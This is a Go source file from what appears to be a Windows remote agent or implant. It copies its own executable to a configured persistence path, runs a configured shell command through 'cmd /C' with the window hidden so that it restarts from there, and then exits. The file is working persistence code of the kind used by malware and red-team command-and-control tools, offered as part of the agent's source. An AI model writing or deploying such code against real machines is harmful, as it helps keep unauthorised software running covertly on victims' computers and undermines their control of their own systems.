package modules

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"syscall"
	"viper"
)

func moveAgentExecutable() error {
	sourcePath, err := os.Executable()
	if err != nil {
		return err
	}
	inputFile, err := os.Open(sourcePath)
	if err != nil {
		return fmt.Errorf("Couldn't open agent file: %s", err)
	}
	outputFile, err := os.Create(viper.Conf.Agent.PersistencePath)
	if err != nil {
		inputFile.Close()
		return fmt.Errorf("Couldn't open persistence path file: %s", err)
	}
	defer outputFile.Close()
	_, err = io.Copy(outputFile, inputFile)
	inputFile.Close()
	if err != nil {
		return fmt.Errorf("Copying to persistence file failed: %s", err)
	}
	// You wouldn't be able to remove the agent file, because it is running and windows is shit.
	// err = os.Remove(sourcePath)
	// if err != nil {
	// return fmt.Errorf("Failed to remove temporary agent file: %s", err)
	// }
	return nil
}

func createPersistence() error {
	command := fmt.Sprintf(viper.Conf.Agent.PersistenceCommand, viper.Conf.Agent.PersistencePath)
	log.Printf("Running shell command: '%s'.", command)
	cmd := exec.Command("cmd", "/C", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("Failed to run shell command: %s", err)
	}
	return nil
}

func Persist() error {
	sourcePath, err := os.Executable()
	if err != nil {
		return err
	}
	// If running from persistence, don't persist again.
	if sourcePath == viper.Conf.Agent.PersistencePath {
		return nil
	}
	log.Print("Persisting.")
	err = moveAgentExecutable()
	if err != nil {
		return err
	}
	err = createPersistence()
	if err != nil {
		return err
	}
	log.Print("Persisted. Exiting, agent will restart shortly.")
	os.Exit(0)
	return nil
}
